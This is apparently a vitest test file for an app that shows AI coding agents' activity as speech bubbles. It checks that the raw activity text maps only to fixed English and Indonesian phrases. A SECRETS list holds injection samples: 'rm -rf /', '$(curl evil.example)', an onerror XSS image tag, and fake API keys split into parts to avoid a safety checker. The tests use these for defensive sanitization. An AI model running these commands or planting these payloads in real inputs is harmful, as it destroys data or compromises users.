import { describe, expect, it } from 'vitest';
import { MESSAGES } from '../src/i18n';
import type { OfficeActivity } from '../src/office/activityFeed';
import { semanticBubble, semanticCategory } from '../src/office/semanticBubble';
import { quietCharacters, selectBubbles, trackArrivals, BUBBLE_FADE_MS, BUBBLE_VISIBLE_MS, STALE_ARRIVAL_MS, type BubbleAgent } from '../src/office/scene/bubbles';
import { buildSurfaceSpec, resolveScreenContent, surfaceGeometry } from '../src/office/scene/interior/prefabs/screens/screenContent';

const en = MESSAGES.en;
const id = MESSAGES.id;
const AT = '2026-10-15T10:00:00.000Z';
// Secret-looking and home-path samples are assembled from parts so the public-safety checker does not flag this file.
const HOME = ['', 'Users', 'someone'].join('/');
const WINDOWS_HOME = ['C:', 'Users', 'x'].join('\\');
const ANTHROPIC_KEY = ['sk', 'ant', 'api03', 'abcdef0123456789'].join('-');
const ENV_SECRET = ['OPENAI_API_KEY', ['sk', 'live', '123'].join('-')].join('=');

const activity = (kind: OfficeActivity['kind'], extra: Partial<OfficeActivity> = {}): OfficeActivity =>
  ({ id: `a-${kind}-${extra.text ?? ''}`, characterId: 's1:primary', sessionId: 's1', kind, text: kind, at: AT, ...extra });
const tool = (activityKind: NonNullable<OfficeActivity['activity']>, text: string) => activity('tool', { activity: activityKind, text });

/** Every phrase the formatter can produce, per language. Output must be one of these, never raw text. */
const CATALOG = {
  en: Object.values(en.officeUx.semantic),
  id: Object.values(id.officeUx.semantic),
};

/** Raw strings that must never reach a bubble, toast, name tag or screen. */
const SECRETS = [
  'rm -rf /', `${HOME}/secret.txt`, WINDOWS_HOME, ANTHROPIC_KEY, ENV_SECRET,
  '$(curl evil.example)', '`curl evil`', '<img src=x onerror=alert(1)>', '**bold** [link](https://evil.example)', 'secret.txt',
];

describe('semantic bubble phrases (EN)', () => {
  it.each([
    ['build', tool('command', 'Running npm run build'), 'Building the project…'],
    ['file read', tool('read', 'Reading src/app.ts'), 'Reading a file…'],
    ['search', tool('search', 'Searching for login'), 'Searching files…'],
    ['git', tool('command', 'Running git status'), 'Checking repository…'],
    ['tests', tool('command', 'Running pnpm vitest run'), 'Running tests…'],
    ['test kind', tool('test', 'Testing'), 'Running tests…'],
    ['edit', tool('edit', 'Editing src/app.ts'), 'Editing code…'],
    ['write (edit kind)', tool('edit', 'Writing notes.md'), 'Editing code…'],
    ['web', tool('web', 'Fetching https://example.com'), 'Researching…'],
    ['planning', tool('think', 'Thinking'), 'Planning next steps…'],
    ['review', tool('tool', 'Reviewing changes in the diff'), 'Reviewing changes…'],
    ['delegation (sub-agent spawned)', activity('delegated', { text: 'Review tests' }), 'Coordinating another agent…'],
    ['delegation (tool)', tool('delegate', 'Delegating'), 'Coordinating another agent…'],
    ['approval', activity('approval', { text: 'Run npm test' }), 'Waiting for approval…'],
    ['failed', activity('failed', { text: 'Rate limited' }), 'Something needs attention'],
    ['reply', activity('reply', { text: 'Here is your answer' }), 'Responding…'],
    ['prompt', activity('prompt', { text: 'Fix the login' }), 'Got a new task…'],
    ['unknown tool', tool('tool', 'Something else'), 'Working…'],
  ])('maps %s', (_name, input, phrase) => {
    expect(semanticBubble(input, en)).toBe(phrase);
  });

  it('shows nothing for a finished turn, so no ongoing status is left behind', () => {
    expect(semanticBubble(activity('done', { text: 'All set' }), en)).toBeUndefined();
  });
});

describe('semantic bubble phrases (ID)', () => {
  it.each([
    [tool('command', 'npm run build'), 'Membangun proyek…'],
    [tool('read', 'src/app.ts'), 'Membaca berkas…'],
    [tool('search', 'login'), 'Mencari berkas…'],
    [tool('command', 'git log'), 'Memeriksa repositori…'],
    [tool('command', 'pnpm test'), 'Menjalankan tes…'],
    [tool('edit', 'src/app.ts'), 'Mengedit kode…'],
    [tool('web', 'example'), 'Meneliti…'],
    [tool('think', 'thinking'), 'Menyusun langkah berikutnya…'],
    [tool('tool', 'review the diff'), 'Meninjau perubahan…'],
    [activity('delegated', { text: 'Review' }), 'Mengoordinasikan agent lain…'],
    [activity('approval', { text: 'Run' }), 'Menunggu persetujuan…'],
    [activity('failed', { text: 'x' }), 'Ada yang perlu perhatian'],
    [activity('reply', { text: 'x' }), 'Sedang membalas…'],
    [activity('prompt', { text: 'x' }), 'Menerima tugas baru…'],
    [tool('tool', 'x'), 'Sedang bekerja…'],
  ])('maps %j to its Indonesian phrase', (input, phrase) => {
    expect(semanticBubble(input, id)).toBe(phrase);
  });

  it('keeps the same phrase categories in both catalogs', () => {
    expect(Object.keys(id.officeUx.semantic).sort()).toEqual(Object.keys(en.officeUx.semantic).sort());
  });
});

describe('semantic categories', () => {
  it('classifies execution prefixes and never treats paths as executed actions', () => {
    expect(semanticCategory({ kind: 'tool', activity: 'read', text: 'Reading test/vitest.config.ts' })).toBe('read');
    expect(semanticCategory({ kind: 'tool', activity: 'edit', text: 'Editing src/git-status.ts' })).toBe('edit');
    expect(semanticCategory({ kind: 'tool', activity: 'command', text: 'Running npm test' })).toBe('test');
    expect(semanticCategory({ kind: 'tool', activity: 'command', text: 'Running rm -rf /' })).toBe('delete');
  });

  it.each([
    ['write_file', 'write'], ['Write', 'write'], ['write_to_file', 'write'],
    ['edit_file', 'edit'], ['functions.apply_patch', 'edit'], ['replace_file_content', 'edit'],
    ['create_file', 'create'], ['create_directory', 'create'], ['delete_file', 'delete'],
    ['mcp__filesystem__remove_file', 'delete'], ['move_file', 'move'], ['rename_file', 'move'], ['copy_file', 'copy'],
    ['format_code', 'format'], ['build_project', 'build'], ['install_dependencies', 'install'], ['query_database', 'data'],
    ['read_file', 'read'], ['search_files', 'search'],
  ] as const)('uses exact reported tool %s rather than words in its file target', (name, category) => {
    const input = activity('tool', { activity: 'tool', tool: name, target: 'rm old.txt', text: 'git status' });
    expect(semanticCategory(input)).toBe(category);
    for (const language of ['en', 'id'] as const) {
      expect(semanticBubble(input, MESSAGES[language])).toBe(MESSAGES[language].officeUx.semantic[category]);
      expect(semanticBubble(input, MESSAGES[language])).not.toContain(input.target);
    }
  });

  it.each([
    ['rm -- old.txt', 'delete'], ['Remove-Item old.txt', 'delete'], ['mv a.txt b.txt', 'move'], ['cp a.txt b.txt', 'copy'],
    ['mkdir new-folder', 'create'], ['touch new.txt', 'create'], ['npm run build', 'build'], ['cargo build --release', 'build'],
    ['pnpm install', 'install'], ['python3 -m pip install example', 'install'], ['pnpm exec vitest run', 'test'],
    ['cargo test', 'test'], ['pnpm lint', 'review'], ['prettier --write src', 'format'], ['prettier --check src', 'review'],
    ['cargo fmt --check', 'review'], ['cargo fmt', 'format'], ['sqlite3 data.db .tables', 'data'], ['jq .items data.json', 'data'],
  ] as const)('recognizes an actual executed command prefix: %s', (command, category) => {
    expect(semanticCategory({ kind: 'tool', activity: 'command', text: `Running ${command}` })).toBe(category);
    expect(semanticCategory({ kind: 'tool', activity: 'tool', tool: 'functions.exec_command', target: command, text: 'Terminal' })).toBe(category);
  });

  it.each([
    'rm --help', "rm '--help'", 'rm --version', 'rm --dry-run old.txt', 'Remove-Item old.txt -WhatIf',
    'cp --help a b', 'npm install --dry-run', 'echo rm old.txt', 'printf "git status"', 'cat delete_file.txt',
    'cd project && rm old.txt', 'echo ready; rm old.txt', 'rm old.txt && echo done', 'git status | cat', 'python3 report.py',
  ])('keeps help, dry runs, quoted instructions and compound commands generic: %s', command => {
    expect(semanticCategory({ kind: 'tool', activity: 'command', text: command })).toBe('command');
  });

  it('does not infer file mutations from prompts, searches, file names or unknown tool suffixes', () => {
    expect(semanticCategory({ kind: 'prompt', text: 'delete_file old.txt', tool: 'delete_file' })).toBe('prompt');
    expect(semanticCategory({ kind: 'tool', activity: 'read', tool: 'read_file', target: 'rm old.txt' })).toBe('read');
    expect(semanticCategory({ kind: 'tool', activity: 'search', text: 'rm old.txt delete_file' })).toBe('search');
    expect(semanticCategory({ kind: 'tool', activity: 'tool', text: 'Please delete old.txt' })).toBe('working');
    expect(semanticCategory({ kind: 'tool', activity: 'tool', tool: 'not_delete_file', text: 'delete_file' })).toBe('working');
    expect(semanticCategory({ kind: 'tool', activity: 'tool', tool: '__proto__', text: 'rm old.txt' })).toBe('working');
    expect(semanticCategory({ kind: 'tool', activity: 'tool', text: 'notes/review.md' })).toBe('working');
  });

  it('prefers an explicit command target over a conflicting presentation label', () => {
    expect(semanticCategory({ kind: 'tool', activity: 'command', tool: 'run_command', target: 'echo hello', text: 'Running rm old.txt' })).toBe('command');
    expect(semanticCategory({ kind: 'tool', activity: 'command', tool: 'run_command', target: 'cp a b', text: 'Terminal' })).toBe('copy');
    expect(semanticCategory({ kind: 'tool', activity: 'command', tool: 'run_command', target: 'Running rm old.txt', text: 'Terminal' })).toBe('command');
  });

  it('keeps oversized command bodies generic while retaining exact file-tool identity', () => {
    const target = `rm ${'example/'.repeat(300)} --dry-run`;
    expect(semanticCategory({ kind: 'tool', activity: 'command', target })).toBe('command');
    expect(semanticCategory({ kind: 'tool', activity: 'edit', tool: 'write_file', target })).toBe('write');
  });
});

describe('injection: raw labels never reach the output', () => {
  const labels = SECRETS.map(secret => `Running ${secret}`);
  const events: OfficeActivity[] = [
    ...labels.flatMap(label => [
      tool('command', label), tool('read', label), tool('search', label), tool('edit', label), tool('web', label),
      tool('think', label), tool('tool', label), tool('test', label), tool('delegate', label),
    ]),
    ...SECRETS.flatMap(secret => [
      activity('approval', { text: secret }), activity('reply', { text: secret }), activity('failed', { text: secret }),
      activity('prompt', { text: secret }), activity('delegated', { text: secret }), activity('done', { text: secret }),
    ]),
  ];

  it.each([['en', en], ['id', id]] as const)('outputs only catalog phrases (%s)', (language, t) => {
    for (const event of events) {
      const phrase = semanticBubble(event, t);
      if (phrase === undefined) continue;
      expect(CATALOG[language]).toContain(phrase);
      for (const secret of SECRETS) expect(phrase).not.toContain(secret);
    }
  });

  it('never leaks a secret fragment, even though the raw label is still read for its category', () => {
    for (const event of events) {
      for (const t of [en, id]) {
        const phrase = semanticBubble(event, t) ?? '';
        for (const fragment of ['secret', 'sk-', 'OPENAI', 'curl', 'rm ', 'Users', 'evil', '<img', '[link]', '/']) {
          expect(phrase).not.toContain(fragment);
        }
      }
    }
  });

  it('keeps raw text out of the in-world screens too', () => {
    const spec = buildSurfaceSpec(resolveScreenContent({
      device: 'monitor', lightsOn: true, night: false,
      occupant: { name: 'Agent', status: 'working', activity: 'command', target: `rm -rf ${HOME}/secret.txt`, summary: ENV_SECRET },
    }), surfaceGeometry(0.72, 0.43), { language: 'en', phase: 0 });
    expect(spec.target).toBe('Deleting files…');
    expect(JSON.stringify(spec)).not.toContain('secret');
    expect(JSON.stringify(spec)).not.toContain('sk-live');
    const idSpec = buildSurfaceSpec(resolveScreenContent({
      device: 'monitor', lightsOn: true, night: false, occupant: { name: 'Agent', status: 'working', activity: 'edit', target: `${HOME}/x/a.ts` },
    }), surfaceGeometry(0.72, 0.43), { language: 'id', phase: 0 });
    expect(idSpec.target).toBe('Mengedit kode…');
  });
});

describe('bubble selection: idle hides, done ends, stale never shows', () => {
  const NOW = Date.parse(AT) + 1_000;
  const select = (events: OfficeActivity[], extra: Partial<Parameters<typeof selectBubbles>[0]> = {}) => {
    const arrivals = new Map(events.map(event => [event.id, NOW - 500]));
    return selectBubbles({ activities: events, arrivals, now: NOW, visible: new Set(['s1:primary']), selectedId: null, ...extra });
  };

  it('shows a bubble for an ongoing activity and hides it once it has expired', () => {
    const shown = select([tool('command', 'npm test')]);
    expect(shown.get('s1:primary')?.activity.kind).toBe('tool');
    const arrivals = new Map([['a-tool-npm test', NOW - BUBBLE_VISIBLE_MS - BUBBLE_FADE_MS - 1]]);
    expect(selectBubbles({ activities: [tool('command', 'npm test')], arrivals, now: NOW, visible: new Set(['s1:primary']), selectedId: null }).size).toBe(0);
  });

  it('shows no bubble after the turn is done, even while the old line is still within its window', () => {
    const later = activity('done', { id: 'done-1', text: 'All set', at: '2026-10-15T10:00:00.500Z' });
    expect(select([tool('command', 'npm test'), later]).size).toBe(0);
  });

  it('shows no bubble for an idle or away character', () => {
    const quiet = quietCharacters([{ id: 's1:primary', status: 'idle' }]);
    expect(select([tool('command', 'npm test')], { quiet }).size).toBe(0);
    expect(quietCharacters([{ id: 'a', status: 'working' }, { id: 'b', status: 'paused' }, { id: 'c', status: 'offline' }])).toEqual(new Set(['b', 'c']));
  });

  it('ends a reply bubble when the turn completes, so no reply text lingers', () => {
    const reply = activity('reply', { id: 'reply-1', text: 'Here is the answer' });
    expect(select([reply]).get('s1:primary')?.activity.kind).toBe('reply');
    expect(select([reply, activity('done', { id: 'done-1', at: '2026-10-15T10:00:00.900Z' })]).size).toBe(0);
  });

  it('suppresses nothing for characters that are working', () => {
    const shown = select([tool('edit', 'Editing a.ts')]);
    expect(shown.size).toBe(1);
    expect(semanticBubble(shown.get('s1:primary')!.activity, en)).toBe('Editing code…');
  });

  it('shows a bubble for prompt submissions and keeps showing the character’s live activity while thinking, working or waiting', () => {
    const promptShown = select([activity('prompt', { id: 'p-1', text: 'Inspect markdown files' })]);
    expect(promptShown.get('s1:primary')?.tone).toBe('thought');
    expect(semanticBubble(promptShown.get('s1:primary')!.activity, en)).toBe('Got a new task…');

    // Even after the initial 4 s event window expires, a character that is still thinking/working/waiting keeps its bubble.
    const expiredArrivals = new Map([['a-tool-npm test', NOW - BUBBLE_VISIBLE_MS - BUBBLE_FADE_MS - 100]]);
    const stillThinking = selectBubbles({
      activities: [tool('command', 'npm test')],
      arrivals: expiredArrivals,
      now: NOW,
      visible: new Set(['s1:primary']),
      agents: [{ id: 's1:primary', status: 'thinking' }],
      selectedId: null,
    });
    expect(semanticBubble(stillThinking.get('s1:primary')!.activity, en)).toBe('Planning next steps…');

    const stillWorking = selectBubbles({
      activities: [],
      arrivals: new Map(),
      now: NOW,
      visible: new Set(['s1:primary']),
      agents: [{ id: 's1:primary', status: 'working', activity: 'search', target: 'docs/README.md' }],
      selectedId: null,
    });
    expect(semanticBubble(stillWorking.get('s1:primary')!.activity, en)).toBe('Searching files…');

    // Once the character returns to idle, the bubble disappears immediately.
    const nowIdle = selectBubbles({
      activities: [],
      arrivals: new Map(),
      now: NOW,
      visible: new Set(['s1:primary']),
      quiet: quietCharacters([{ id: 's1:primary', status: 'idle' }]),
      agents: [{ id: 's1:primary', status: 'idle' }],
      selectedId: null,
    });
    expect(nowIdle.size).toBe(0);
  });
});

describe('bubbles only while a character is actually doing something', () => {
  const NOW = Date.parse(AT) + 1_000;
  const live = (agent: BubbleAgent) =>
    selectBubbles({ activities: [], arrivals: new Map(), now: NOW, visible: new Set(['s1:primary']), agents: [agent], selectedId: null });

  it('shows nothing for waiting with nothing pending or for blocked, but keeps the approval bubble while one is pending', () => {
    expect(live({ id: 's1:primary', status: 'waiting' }).size).toBe(0);
    expect(live({ id: 's1:primary', status: 'blocked' }).size).toBe(0);
    expect(live({ id: 's1:primary', status: 'waiting', pendingApprovalId: 'ap-1' }).get('s1:primary')?.tone).toBe('attention');
  });

  it('shows nothing for an observed session whose last event is no longer live', () => {
    expect(live({ id: 's1:primary', status: 'working', activity: 'edit', control: 'observed', live: false }).size).toBe(0);
    expect(live({ id: 's1:primary', status: 'working', activity: 'edit', control: 'observed', live: true }).size).toBe(1);
  });

  it('never pops a bubble for late-loaded history, only for activity that is actually new', () => {
    const first = trackArrivals(undefined, [], NOW);
    const old = activity('tool', { id: 'old', at: new Date(NOW - STALE_ARRIVAL_MS - 5_000).toISOString(), activity: 'edit' });
    const fresh = activity('tool', { id: 'fresh', at: new Date(NOW - 2_000).toISOString(), activity: 'edit' });
    const arrivals = trackArrivals(first, [old, fresh], NOW);
    expect(arrivals.get('old')).toBe(Date.parse(old.at));
    expect(arrivals.get('fresh')).toBe(NOW);
    expect(selectBubbles({ activities: [old], arrivals, now: NOW, visible: new Set(['s1:primary']), selectedId: null }).size).toBe(0);
  });
});
